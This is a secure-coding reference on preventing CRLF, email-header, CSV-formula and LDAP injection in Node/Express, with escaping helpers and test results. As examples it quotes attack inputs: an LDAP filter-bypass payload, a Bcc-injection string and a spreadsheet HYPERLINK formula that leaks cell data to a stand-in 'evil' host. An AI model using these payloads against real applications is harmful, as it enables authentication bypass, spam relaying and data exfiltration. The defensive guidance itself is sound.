---
id: computing-software.web-development.node-express.header-crlf-and-ldap-injection
name: header-crlf-and-ldap-injection
category: computing-software
field: web-development
product: node-express
tags: [header-injection, crlf-injection, ldap-injection, email-header-injection, response-splitting, security]
level: practitioner
status: gated
description: "Preventing CRLF/header injection (redirects, cookies, email headers, CSV formula injection) and LDAP filter/DN injection with proper escaping and parameterised binds."
sources:
  - https://owasp.org/www-community/vulnerabilities/CRLF_Injection
  - https://cheatsheetseries.owasp.org/cheatsheets/LDAP_Injection_Prevention_Cheat_Sheet.html
  - https://datatracker.ietf.org/doc/html/rfc4515#section-3
licence: Apache-2.0
version: 4
updated: 2026-11-17
---

# Header, CRLF and LDAP injection

## 1. CRLF / HTTP header injection
Untrusted input containing `\r\n` placed in a header can add headers or split the response (set cookies, inject HTML, poison caches).
- Node's `http` module rejects CR/LF (and NUL and characters above U+00FF) in header values with `ERR_INVALID_CHAR`, so `res.setHeader("Location", userInput)` throws instead of splitting (checked for `%0d%0a`, a lone `%0a`, NUL and a euro sign); handle the error as 400 rather than 500. Express `res.redirect()` does not throw: it percent-encodes the target (`/a%0D%0ASet-Cookie:%20x=1`). Proxies, older frameworks and raw socket code may not.
- Content-Disposition filenames: use RFC 6266 encoding (`content-disposition` npm package, v2 API `create(filename)`, which emits an escaped `filename=` plus `filename*=UTF-8''...`) instead of string concatenation.
- Redirects: validate the target (allowlist / relative-only), which also prevents open redirects.

## 2. Email header injection
Contact forms that put user input in `To`, `Cc`, `Subject` or `From` let attackers add recipients (`victim@x.com\r\nBcc: list@spam`). Use a mail library that sets headers structurally and reject CR/LF in any header field yourself. Ran: Django 6.1 `send_mail` raises `ValueError: Header values may not contain linefeed or carriage return characters` for a CR/LF subject or recipient; nodemailer 10.1.7 does NOT reject: a CR/LF subject was folded into one line (`Subject: hi Bcc: spam@x.com`, no new header), but a recipient `b@x.com` + CRLF + `Bcc: z@x.com` was parsed into an address group containing `z@x.com`, so validate recipient addresses before passing them in. Action Mailer was not run (gated: unconfirmed, source is paywalled or blocked); put user email in `Reply-To`, never `From` (also breaks DMARC).

## 3. CSV / formula injection
Exported cells starting with `=`, `+`, `-`, `@`, tab or CR are executed as formulas in Excel/Sheets (`=HYPERLINK("http://evil/?"&A1)`). Prefix such values with `'` when generating CSVs for spreadsheet users (gated: unconfirmed, source is paywalled or blocked; Excel and Sheets were not available to run).

## 4. LDAP injection
Login lookups like `(uid=${username})` with `*)(uid=*))(|(uid=*` bypass auth or dump the directory.
```js
// RFC 4515 filter escaping
const esc = s => s.replace(/[\\*()\0]/g, c => "\\" + c.charCodeAt(0).toString(16).padStart(2, "0"));
const filter = `(&(objectClass=person)(uid=${esc(username)}))`;
```
- DN components need different escaping (RFC 4514: `, + " \ < > ; =` and leading `#`/space). Use library helpers (ldapts `EqualityFilter` objects, Python `ldap3.utils.conv.escape_filter_chars` and `ldap3.utils.dn.escape_rdn`; Java Spring LDAP `LdapEncoder` was not run: gated: unconfirmed, source is paywalled or blocked). Ran: ldapts 8.2.0 `EqualityFilter` turned `*)(uid=*))(|(uid=*` into `\2a\29\28uid=\2a\29\29\28|\28uid=\2a`, and `escape_rdn` escaped `,+"\<>;=` and a leading space.
- Authenticate by binding as the user's DN with their password after looking up the DN with an escaped filter; reject empty passwords (an empty password is an anonymous/unauthenticated bind on many servers and "succeeds") (gated: unconfirmed, source is paywalled or blocked; no LDAP server was available).
- Use a least-privilege service account for searches.

## Verify
- [ ] Tests submit `\r\n`, `*`, `)(` and NUL in every header-bound or LDAP-bound field and get 400 or a safe failure.

## Checked
Run on Windows with Node 24.22: header-value rejection (`%0d%0a`, a lone `%0a`, NUL and a euro sign all gave `ERR_INVALID_CHAR`), Express 5 redirect percent-encoding, `content-disposition` 2.0.1 `create` (quote, semicolon and CRLF in a filename encoded into `filename*=UTF-8''...`), the RFC 4515 `esc` helper (`\2a\29\28...`; backslash and NUL become `\5c` and `\00`). Header handling is in Node's HTTP parser and is not OS-specific.
